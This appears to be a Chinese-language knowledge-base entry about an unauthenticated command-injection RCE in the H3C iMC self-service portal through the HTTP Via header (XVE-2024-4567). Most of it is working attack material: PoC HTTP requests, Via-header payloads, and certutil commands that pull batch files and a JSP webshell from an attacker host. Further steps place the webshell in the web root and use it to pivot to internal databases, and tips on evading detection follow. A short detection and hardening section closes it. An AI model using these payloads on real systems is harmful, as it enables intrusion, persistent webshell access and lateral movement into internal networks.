---
id: web-java-component-h3c-imc-via-header-command-execution
title: H3C iMC XVE-2024-4567：Via 请求头命令注入 RCE 与 certutil 分段投递 JSP
type: scenario
domain: web
path: web/java/component
technique: h3c-imc-via-header-rce
aliases:
- H3C iMC RCE
- XVE-2024-4567
- Via 头命令注入
- byod/index.xhtml RCE
- selfservice/login.jsf RCE
- iMC certutil 投递 JSP
tags:
- h3c
- imc
- java
- rce
- command-injection
- via-header
- certutil
- jsp-webshell
cve: []
severity: critical
confidence: high
status: verified
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V62
  verified_at: '2026-11-05T11:53:09+08:00'
  notes: 已对照原文与20张图核对：Via 头 whoami 回显 win-fsrrnies0g0\administrator（图02/16）、echo/type/del 文件读写（图04-06/12）、certutil 下载 1.bat/2.bat（图08-14）、move 到 D:\Program Files\iMC\client\web\apps\selfservice\images\ 后访问 JSP（图14/15），冰蝎 JavaDynamicPayload+JAVA_AES_RAW 连接成功（图15），代理访问 Redis 3.0.7/SQL Server/Oracle（图16/17/19/20）。未验证点：原文未给出受影响版本区间，仅有 XVE-2024-4567 编号，故未设 affected_versions；无需认证为文章未明确展示的推断（请求带 JSF 会话 Cookie）；PoC 未本机复跑；frontmatter 无 sources/source_url。
---

## 一句话结论

H3C iMC 用户自助服务门户的 `/byod/index.xhtml` 与 `/selfservice/login.jsf` 会把 HTTP `Via` 请求头的值当作 Windows 命令执行，攻击者无需认证即可用 `Via: whoami` 验证 RCE，再通过 `certutil` 分段下载 `.bat`/JSP 写入 `selfservice/images/` 目录，获得 WebShell 并以 iMC 服务账户权限横向内网。

## 原理

- H3C iMC（Intelligent Management Center）的 Java Web 门户（Apache-Coyote/1.1，常见 8081 端口）在部分版本中把请求头 `Via` 传给底层命令执行逻辑，且未做过滤/转义；这对应厂商公告 XVE-2024-4567。
- 受影响入口至少包括 `POST /byod/index.xhtml` 与 `POST /selfservice/login.jsf`；两者都接受 `javax.faces.ViewState` 等 JSF 参数，但真正注入点在 `Via` 头，修改该头即可执行任意 Windows 命令，命令 stdout 直接回显在响应体。
- 因为执行进程是 iMC 服务（通常以管理员/服务账户运行），攻击者获得的是该账户权限；默认 Web 根为 `D:\Program Files\iMC\client\web\apps\selfservice\`，其中 `images/` 可被服务账户写入，且 JSP 可被解析。
- 命令长度受 HTTP 头/中间件限制，长命令容易失败；文章用 `certutil.exe -urlcache -split -f` 先下载一个 `.bat`，再由 `.bat` 下载/移动 JSP，把长操作拆成多步短命令。
- 写入 JSP 后访问 `http://host:8081/selfservice/images/<name>.jsp` 即可执行；再通过 WebShell 的代理能力进入内网，访问 Redis、SQL Server、Oracle 等只在内网暴露的服务。

## 触发条件

- 目标暴露 H3C iMC 用户自助服务门户（常见 8081），且版本受 XVE-2024-4567 影响。
- `/byod/index.xhtml` 或 `/selfservice/login.jsf` 可达，且应用把 `Via` 头传入命令执行。
- iMC 运行在 Windows，服务账户对 Web 根有写权限；`selfservice/images/` 可被 Web 解析 JSP。
- 攻击者能提供外部 HTTP 服务（用于 certutil 下载），或能直接写入文件。

## 利用步骤

1. 确认 RCE：在任意入口添加 `Via` 头执行 `whoami`：
   ```http
   POST /selfservice/login.jsf HTTP/1.1
   Host: target:8081
   Via: whoami
   Content-Type: application/x-www-form-urlencoded
   Content-Length: 0
   ```
   响应体回显 `win-xxxx\administrator` 之类即成功。
2. 验证文件写入与回显：
   ```http
   Via: echo 112 > 132.txt
   Via: dir
   Via: type 132.txt
   Via: del /f 132.txt
   ```
3. 准备 `1.bat`，内容为下载 JSP：
   ```bat
   certutil.exe -urlcache -split -f http://attacker/520.jsp
   ```
   在攻击机启动 HTTP 服务：
   ```bash
   python3 -m http.server 80
   ```
4. 用短命令下载并执行 `1.bat`：
   ```http
   Via: certutil.exe -urlcache -split -f http://attacker/1.bat
   Via: 1.bat
   ```
5. 准备 `2.bat`，把 JSP 移动到 Web 根（Windows 路径必须用反斜杠）：
   ```bat
   move 520.jsp "D:\Program Files\iMC\client\web\apps\selfservice\images\520.jsp"
   ```
   同样用 certutil 下载并执行 `2.bat`。
6. 访问 WebShell：
   ```text
   http://target:8081/selfservice/images/520.jsp
   ```
   用冰蝎/哥斯拉等客户端连接（文章使用 JavaDynamicPayload + JAVA_AES_RAW），成功后通过代理访问内网 Redis、SQL Server、Oracle 等。

## PoC

```http
POST /byod/index.xhtml HTTP/1.1
Host: target:8081
Via: whoami
Content-Type: application/x-www-form-urlencoded
Content-Length: 0

# 响应：win-fsrrnies0g0\administrator
```

```http
POST /selfservice/login.jsf HTTP/1.1
Host: target:8081
Via: certutil.exe -urlcache -split -f http://attacker/1.bat
Content-Type: application/x-www-form-urlencoded
Content-Length: 0
```

```bat
:: 1.bat
certutil.exe -urlcache -split -f http://attacker/520.jsp

:: 2.bat
move 520.jsp "D:\Program Files\iMC\client\web\apps\selfservice\images\520.jsp"
```

## 变体与关联

- 变体：若 `Via` 头被过滤，尝试其他可能进入命令拼接的请求头（`X-Forwarded-For`、`User-Agent`、`Referer`）或 JSF 参数；以实际版本行为为准。
- 变体：长命令可拆成多个 `.bat`，或用 PowerShell `Invoke-WebRequest`、`bitsadmin`、`mshta` 下载；也可直接把 Base64 内容分段 echo 追加到文件。
- 变体：Web 根路径可通过报错、目录列表或公开资料确定；JSP 文件名可随机化以规避检测。
- 关联：[[web-generic-file-inclusion-fastapi-file-management-traversal]]（任意文件读取定位路径）、[[pentest-c2-implant-mitm-task-injection]]（WebShell 后的 C2 控制）。
- 边界：目标已打补丁、`Via` 头被 WAF/反向代理过滤、Web 根不可写、JSP 解析被禁用、或 iMC 以低权限账户运行时，利用失败或降级。

## 检测与防御

- 检测：请求头 `Via` 中出现命令特征（`whoami`、`dir`、`certutil`、`cmd`、`powershell`、`>`、`|`）；iMC/Apache 进程创建 `cmd.exe`/`certutil.exe` 子进程；`selfservice/images/` 出现新增 JSP；WebShell 连接特征（JavaDynamicPayload、加密器）。
- 修复：升级 H3C iMC 到修复 XVE-2024-4567 的版本；在 WAF/反向代理层拒绝或清洗 `Via` 等非必要请求头。
- 加固：iMC 以最小权限账户运行，Web 根不可写；禁用不必要的 JSP 解析/上传；对 Web 目录做文件完整性监控；限制服务器出网（certutil 下载）；监控异常子进程与内网连接。
